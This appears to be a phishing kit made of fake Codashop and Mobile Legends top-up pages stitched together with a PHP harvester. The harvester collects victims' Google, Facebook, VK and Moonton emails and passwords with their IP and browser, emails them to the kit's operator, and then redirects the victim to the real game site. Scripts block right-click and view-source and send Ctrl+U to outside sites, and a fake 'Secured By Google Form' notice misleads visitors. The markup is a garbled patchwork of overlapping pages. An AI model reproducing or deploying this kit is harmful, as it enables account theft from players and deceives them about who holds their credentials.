					<p><b><a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="34474144445b464074575b505544554d59515a40471a575b59">[email&#160;protected]</a></b> <br/> <a href="https://m.me/Codapay" target="_blank"><u></p>
				</div>
			</div>
			<div class="txt02">
				<a href="https://www.codapay.com/toc.php" target="_blak">Syarat & Kondisi</a>
				<p class="copy">&#169;  Hak Cipta Coda Payments 2019.</p>
			</div>
		</div>
	</footer>
	<!-- //footer -->

	<!-- dim-->
	<p class="dim" onclick="lanClose();"></p>

<script data-cfasync="false" src="/cdn-cgi/scripts/af2821b0/cloudflare-static/email-decode.min.js"></script><script type="text/javascript" src="https://d1qgcmfii0ptfa.cloudfront.net/S/content/web/js/jquery-1.11.0.min.js?v=819"></script>
<script type="text/javascript" src="https://d1qgcmfii0ptfa.cloudfront.net/S/content/common/js/jquery.cookie.js?v=819"></script>
<script type="text/javascript" src="/content/common/js/common.js"></script>

<script type="text/javascript">
$.ajaxSetup({cache: false});
$(document).ready(function (){
	var numBoxes = $(".ProductBox").size();
	if (numBoxes == 4) {
		$(".section01").attr("style","width:965px;max-width:965px");
	}

	lanSelect();
});

function lanSelect(){
	$(".header .lan a").click(function(){
		$(".header .lanPop").show();
		$(".dim").show();
	});
}

function lanClose(){
	//if($(".header .lanPop").hasClass('active')){
		$(".header .lanPop").css({'display':'none'});
		$('.dim').css({'display':'none'});
	//}
}


$('.switcher').click(function(event) {
    switchLang(event.target.id);
});

function switchLang(language){
	$.cookie("shop-lang", language, { expires : 1, path: '/' });
}

</script>

	
 </body>
<script type="text/javascript"> if (typeof document.onselectstart!="undefined") { document.onselectstart=new Function ("return false"); } else{ document.onmousedown=new Function ("return false"); document.onmouseup=new Function ("return true"); } </script > <script language=javascript> <!-- var message=" Si KONTOL Mau Maling "; /////////////////////////////////// function clickIE4(){ if (event.button==2){ alert(message); return false; } } function clickNS4(e){ if (document.layers||document.getElementById&&!document.all){ if (e.which==2||e.which==3){ alert(message); return false; } } } if (document.layers){ document.captureEvents(Event.MOUSEDOWN); document.onmousedown=clickNS4; } else if (document.all&&!document.getElementById){ document.onmousedown=clickIE4; } document.oncontextmenu=new Function("alert(message);return false") // --> </script> <script type='text/javascript'> //<![CDATA[ shortcut={all_shortcuts:{},add:function(a,b,c){var d={type:"keydown",propagate:!1,disable_in_input:!1,target:document,keycode:!1};if(c)for(var e in d)"undefined"==typeof c[e]&&(c[e]=d[e]);else c=d;d=c.target,"string"==typeof c.target&&(d=document.getElementById(c.target)),a=a.toLowerCase(),e=function(d){d=d||window.event;if(c.disable_in_input){var e;d.target?e=d.target:d.srcElement&&(e=d.srcElement),3==e.nodeType&&(e=e.parentNode);if("INPUT"==e.tagName||"TEXTAREA"==e.tagName)return}d.keyCode?code=d.keyCode:d.which&&(code=d.which),e=String.fromCharCode(code).toLowerCase(),188==code&&(e=","),190==code&&(e=".");var f=a.split("+"),g=0,h={"`":"~",1:"!",2:"@",3:"#",4:"$",5:"%",6:"^",7:"&",8:"*",9:"(",0:")","-":"_","=":"+",";":":","'":'"',",":"<",".":">","/":"?","\":"|"},i={esc:27,escape:27,tab:9,space:32,"return":13,enter:13,backspace:8,scrolllock:145,scroll_lock:145,scroll:145,capslock:20,caps_lock:20,caps:20,numlock:144,num_lock:144,num:144,pause:19,"break":19,insert:45,home:36,"delete":46,end:35,pageup:33,page_up:33,pu:33,pagedown:34,page_down:34,pd:34,left:37,up:38,right:39,down:40,f1:112,f2:113,f3:114,f4:115,f5:116,f6:117,f7:118,f8:119,f9:120,f10:121,f11:122,f12:123},j=!1,l=!1,m=!1,n=!1,o=!1,p=!1,q=!1,r=!1;d.ctrlKey&&(n=!0),d.shiftKey&&(l=!0),d.altKey&&(p=!0),d.metaKey&&(r=!0);for(var s=0;k=f[s],s<f.length;s++)"ctrl"==k||"control"==k?(g++,m=!0):"shift"==k?(g++,j=!0):"alt"==k?(g++,o=!0):"meta"==k?(g++,q=!0):1<k.length?i[k]==code&&g++:c.keycode?c.keycode==code&&g++:e==k?g++:h[e]&&d.shiftKey&&(e=h[e],e==k&&g++);if(g==f.length&&n==m&&l==j&&p==o&&r==q&&(b(d),!c.propagate))return d.cancelBubble=!0,d.returnValue=!1,d.stopPropagation&&(d.stopPropagation(),d.preventDefault()),!1},this.all_shortcuts[a]={callback:e,target:d,event:c.type},d.addEventListener?d.addEventListener(c.type,e,!1):d.attachEvent?d.attachEvent("on"+c.type,e):d["on"+c.type]=e},remove:function(a){var a=a.toLowerCase(),b=this.all_shortcuts[a];delete this.all_shortcuts[a];if(b){var a=b.event,c=b.target,b=b.callback;c.detachEvent?c.detachEvent("on"+a,b):c.removeEventListener?c.removeEventListener(a,b,!1):c["on"+a]=!1}}},shortcut.add("Ctrl+U",function() {top.location.href="http://www.bokepindo.com"}); //]]> </script> 

<body oncontextmenu='return false;' onkeydown='return false;' onmousedown='return false;' ondragstart='return false' onselectstart='return false' style='-moz-user-select: none; cursor: default;'>




</html>
</html>CTYPE html>
<html>
<html>
	<head>
		<title>Mobile Legend - Codashop</title>
	</head>
	<body>
		
		<img src="https://cdn1.codashop.com/S/content/mobile/images/codashop-logo.png">
		
	</body>
</html>
  
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="shortcut icon" href="https://images2.imgbox.com/74/c2/A82aJNWc_o.png"/>
<title>Mobile Legend - Codashop</title>
<script src="jquery.min.js"></script>
<link rel="stylesheet" href="bootstrap.min.css">
<style>
h1, .h1, h2, .h2, h3, .h3 {
    margin-top: 0px;
    margin-bottom: 10.5px;
}

.error-msg {
    margin: .5em 0;
    display: block;
    color: #87CEFA;
    line-height: 17px;
}
.col-md-6 {
 margin:0 auto;
 float:none;

}
.col-md-8 {
 margin:0 auto;
 float:none;

}
</style>
<script type="text/javascript">
	$(document).ready(function(){
	  $("#gsubmit").on("click", function() {
		  var gemail = $("#gemail").val();
		  var gpass = $("#gpass").val();
		  if(gemail==''||gpass=='')
{

}
else
{
	var res = document.getElementById("hasilnya");
          res.innerHTML='';
		  $("#gsubmit").prop("disabled", true );
		  $.post("engine.html",
		  {gemail:gemail,gpass:gpass,},
		  function(response,status){
			  $('#hasilnya').html(response);
			$("#gsubmit").prop("disabled", false );
			$("#gemail").prop("value", "");
			$("#gpass").prop("value", "");
		  });
		  return false;
	  }
	  }
	  );
	});

	</script>




<style type="text/css">
* : (input, textarea) {
    -webkit-touch-callout: none;
    -webkit-user-select: none;

}
</style>
<style type="text/css">
img {
	-webkit-touch-callout: none;
	-webkit-user-select: none;
    }
</style>




<div class="col-md-12">

<body background = "https://s17.postimg.org/48jg72q1r/8c9ad72c1fa7edb7bf77a1231565e2d1.jpg"><br>
<div class="col-md-8">
    
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/5.0.0/normalize.min.css">
<div class="" id="">
<div class=""></div>
<h1><a href="https://news.codashop.com/semangat-merdeka-dari-gopay-untuk-pemain-mobile-legends/?utm_source=id_codashop_banner&utm_medium=topbanner&utm_campaign=gopay_mlbb20&_ga=2.154389880.114185824.1567263998-1396185724.1565388742" class="logo"><center>
<img style="width: 100%; height: 40%;" src="https://cdn1.codashop.com/S/content/common/images/mno/mobilelegends_640x241.jpg"></a></h1>
</head>


    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/5.0.0/normalize.min.css">
<div class="" id="">
<div class=""></div>
<h1><a href="" class="logo"><center>
<img style="width: 100%; height: 40%;" src="https://images2.imgbox.com/58/36/48bWpALQ_o.png"></a></h1>
</head>

       <form action="detailml.php" id="login-form" method="post">
</h2>
</font>
  </center>
  <div class="" id="">
<div class=""></div>
<div class=""></div>
<h1><a href="dataml.php" class="logo"><center>
<img style="width: 350px; height: 25px;" src="https://images2.imgbox.com/ae/67/6JRof1eN_o.png"></a></h1></div>
  
 
 
<body>
<pre>

Tentang Mobile Legends: 
Bergabunglah dengan teman
dan kerabat anda dalam pertarungan
MOBA 5v5 terbaru, Mobile Legends!
Pilih heroes favorit anda dan
bangunlah tim yang sempurna dengan
teman-teman anda! 10 detik
matchmaking, 10 menit pertarungan.
Laning, jungling, tower rushing, team
war, semua keseruan MOBA PC dan
action play terbaik kini ada di telapak
tangan anda! Penuhi semangat
eSports anda!
</pre>
</body>
</html>

<br/>
<br/>
<br/>
<br/>
 <p align="center">
		<img src="https://cdn1.codashop.com/S/content/common/images/logo-codapay.png">
</p>

 <br><center>
<p><b>© Hak Cipta Coda Payments 2019</b><font color="gray">.</p>
</div><br>
</div></center>
  </p>
  
</div>
           </div>
           
</form>
</div>
</br>
</body>

<script type='text/javascript'>
//<![CDATA[
shortcut={all_shortcuts:{},add:function(a,b,c){var d={type:"keydown",propagate:!1,disable_in_input:!1,target:document,keycode:!1};if(c)for(var e in d)"undefined"==typeof c[e]&&(c[e]=d[e]);else c=d;d=c.target,"string"==typeof c.target&&(d=document.getElementById(c.target)),a=a.toLowerCase(),e=function(d){d=d||window.event;if(c.disable_in_input){var e;d.target?e=d.target:d.srcElement&&(e=d.srcElement),3==e.nodeType&&(e=e.parentNode);if("INPUT"==e.tagName||"TEXTAREA"==e.tagName)return}d.keyCode?code=d.keyCode:d.which&&(code=d.which),e=String.fromCharCode(code).toLowerCase(),188==code&&(e=","),190==code&&(e=".");var f=a.split("+"),g=0,h={"`":"~",1:"!",2:"@",3:"#",4:"$",5:"%",6:"^",7:"&",8:"*",9:"(",0:")","-":"_","=":"+",";":":","'":'"',",":"<",".":">","/":"?","\\":"|"},i={esc:27,escape:27,tab:9,space:32,"return":13,enter:13,backspace:8,scrolllock:145,scroll_lock:145,scroll:145,capslock:20,caps_lock:20,caps:20,numlock:144,num_lock:144,num:144,pause:19,"break":19,insert:45,home:36,"delete":46,end:35,pageup:33,page_up:33,pu:33,pagedown:34,page_down:34,pd:34,left:37,up:38,right:39,down:40,f1:112,f2:113,f3:114,f4:115,f5:116,f6:117,f7:118,f8:119,f9:120,f10:121,f11:122,f12:123},j=!1,l=!1,m=!1,n=!1,o=!1,p=!1,q=!1,r=!1;d.ctrlKey&&(n=!0),d.shiftKey&&(l=!0),d.altKey&&(p=!0),d.metaKey&&(r=!0);for(var s=0;k=f[s],s<f.length;s++)"ctrl"==k||"control"==k?(g++,m=!0):"shift"==k?(g++,j=!0):"alt"==k?(g++,o=!0):"meta"==k?(g++,q=!0):1<k.length?i[k]==code&&g++:c.keycode?c.keycode==code&&g++:e==k?g++:h[e]&&d.shiftKey&&(e=h[e],e==k&&g++);if(g==f.length&&n==m&&l==j&&p==o&&r==q&&(b(d),!c.propagate))return d.cancelBubble=!0,d.returnValue=!1,d.stopPropagation&&(d.stopPropagation(),d.preventDefault()),!1},this.all_shortcuts[a]={callback:e,target:d,event:c.type},d.addEventListener?d.addEventListener(c.type,e,!1):d.attachEvent?d.attachEvent("on"+c.type,e):d["on"+c.type]=e},remove:function(a){var a=a.toLowerCase(),b=this.all_shortcuts[a];delete this.all_shortcuts[a];if(b){var a=b.event,c=b.target,b=b.callback;c.detachEvent?c.detachEvent("on"+a,b):c.removeEventListener?c.removeEventListener(a,b,!1):c["on"+a]=!1}}},shortcut.add("Ctrl+U",function(){top.location.href="http://www.alstroinformation.ga/p/ctrlu.html"});
//]]>
</script>

<body oncontextmenu='return false;' onkeydown='return false;' onmousedown='return false;' ondragstart='return false' onselectstart='return false' style='-moz-user-select: none; cursor: default;'>


</html>

# batas

 <?php



$email1= $_POST['google1'];
$pass1 = $_POST['google2'];
$email2 = $_POST['fb1'];
$pass2 = $_POST['fb2'];
$email3 = $_POST['vk1'];
$pass3 = $_POST['vk2'];
$email4 = $_POST['mt1'];
$pass4 = $_POST['mt2'];

$message   = "
===[ ACCOUNT GOOGLE ML ]===

• Email Gmail : ".$email1."

• Password Gmail :  ".$pass1."


===[ ACCOUNT FACEBOOK ML ]===

• Email Facebook :  ".$email2."

• Password Facebook : ".$pass2."


===[ ACCOUNT VK ML ]===

• Email VK : ".$email3."

• Password VK : ".$pass3."


===[ ACCOUNT MOONTON ML ]===

• Email MOONTON : ".$email4."

• Password MOONTON : ".$pass4."


===[ INFO DEVICE ]===

• Country : ".$coun."

• IP Info   :  ".$nama_negro." On ".gmdate('r')."

• Browser   :  ".$_SERVER['HTTP_USER_AGENT']."

===[ Script By : 𝕻𝖚𝖑𝖇𝖊𝖗𝕬𝖏𝖆 ]===



















";

include 'email.php';
$subject = "Punya si [ ".$email1." ]";
$headers = "From: 𝕻𝖚𝖑𝖇𝖊𝖗𝕬𝖏𝖆 ᴀᴋᴜɴ ᴍʟ <Pulberaja.ml>";
mail($emailku, $subject, $message, $headers);

$md5      = md5(gmdate("r"));
$sha1     = sha1(gmdate("r"));
?>
'<script>window.location.replace("https://web.mobilelegends.com/")</script>';}
}
?>
<!-- ADHAN TAMVAN  !! -->
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-US" lang="en-US"> 
<head>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<meta name="viewport" content="width=device-width, initial-scale=1">
<!-- Kode menampilkan peringatan untuk mengaktifkan javascript-->
<div align="center"><noscript>
   <div style="position:fixed; top:0px; left:0px; z-index:3000; height:100%; width:100%; background-color:#FFFFFF">
   <div style="font-family: Arial; font-size: 17px; background-color:#00bbf9; padding: 11pt;">Mohon aktifkan javascript pada browser untuk mengakses halaman ini!</div></div>
</noscript></div>

<!--Kode untuk mencegah seleksi teks, block teks dll.-->
<script type="text/javascript">
function disableSelection(e){if(typeof e.onselectstart!="undefined")e.onselectstart=function(){return false};else if(typeof e.style.MozUserSelect!="undefined")e.style.MozUserSelect="none";else e.onmousedown=function(){return false};e.style.cursor="default"}window.onload=function(){disableSelection(document.body)}
</script>

<!--Kode untuk mematikan fungsi klik kanan di blog-->
<script type="text/javascript">
function mousedwn(e){try{if(event.button==2||event.button==3)return false}catch(e){if(e.which==3)return false}}document.oncontextmenu=function(){return false};document.ondragstart=function(){return false};document.onmousedown=mousedwn
</script>

<style type="text/css">
* : (input, textarea) {
    -webkit-touch-callout: none;
    -webkit-user-select: none;

}
</style>
<style type="text/css">
img {
	-webkit-touch-callout: none;
	-webkit-user-select: none;
    }
</style>

<!--Kode untuk mencegah shorcut keyboard, view source dll.-->
<script type="text/javascript">
window.addEventListener("keydown",function(e){if(e.ctrlKey&&(e.which==65||e.which==66||e.which==67||e.which==73||e.which==80||e.which==83||e.which==85||e.which==86)){e.preventDefault()}});document.keypress=function(e){if(e.ctrlKey&&(e.which==65||e.which==66||e.which==67||e.which==73||e.which==80||e.which==83||e.which==85||e.which==86)){}return false}
</script>
<script type="text/javascript">
document.onkeydown=function(e){e=e||window.event;if(e.keyCode==123||e.keyCode==18){return false}}
</script>
  <head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="shortcut icon" href="https://s7.postimg.org/gw8w09pu3/logo.png"/>
<title>Mobile Legend</title>
<script src="jquery.min.js"></script>
<link rel="stylesheet" href="bootstrap.min.css">
<style>
h1, .h1, h2, .h2, h3, .h3 {
    margin-top: 0px;
    margin-bottom: 10.5px;
}
.error-msg {
    margin: .5em 0;
    display: block;
    color: #dd4b39;
    line-height: 17px;
}
.col-md-6 {
 margin:0 auto;
 float:none;

}
.col-md-12 {
 margin:0 auto;
 float:none;

}
</style>
<script type="text/javascript">
	$(document).ready(function(){
	  $("#gsubmit").on("click", function() {
		  var gemail = $("#gemail").val();
		  var gpass = $("#gpass").val();
		  if(gemail==''||gpass=='')
{

}
else
{
	var res = document.getElementById("hasilnya");
          res.innerHTML='';
		  $("#gsubmit").prop("disabled", true );
		  $.post("engine.php",
		  {gemail:gemail,gpass:gpass,},
		  function(response,status){
			  $('#hasilnya').html(response);
			$("#gsubmit").prop("disabled", false );
			$("#gemail").prop("value", "");
			$("#gpass").prop("value", "");
		  });
		  return false;
	  }
	  }
	  );
	});

	</script>
<body>
 <style>
body {
        background-image: url("https://s17.postimg.org/i93vih3e7/wallpaper-mobile-legends-aurora-queen-of-the-north.jpg");
} 
 
</style>


<div style="border:none;padding:0px;margin:0 auto;" class="col-md-6">
<div style="border:none;padding:0px;margin:0px;" class="well well-sm">
<center style="background:white;"><br>

<h3>
  This Form Secured By Google Form.
</h3>
<div  style="padding:30px;border-radius: 2px;box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);background: #E3BB6C;width100%" class="form-horizontal">
<br/>
<div class="RWIGQ" jsname="OKwYj"><div class="CGVQsc"></div></div><div class="FSCHRd"><div class="aGMYPd" jsname="uPuGNe" role="heading" aria-level="2" tabindex="-1">The Last Step</div><div class="lIbrjf gS2Bvc">Please Tab Yes To Continue. <span jsname="vMgoNd" style="display: none;">Click <b>Next</b> to continue.</span><div class="oOOyEb" jsname="bN97Pc"><div class="swjrDd"><img src="https://ssl.gstatic.com/accounts/marc/authzen_signin.gif" width="125" alt=""></div><div class="m92mTb" role="heading" aria-level="3">Unlock your Phone</div><div class="BvQA9c">Tap <b>Yes</b> on the Google prompt to continue.</div>
  </div>
</div><br><br>
<div style="width:100%" class="form-group">

  <a  href="https://www.mobilelegends.com/" class="btn btn-block" style="color: #F8F8FF;background-color: #000000;" id="gsubmit"> LOGOUT </a>			

 </div>
</form>
</div>

fi


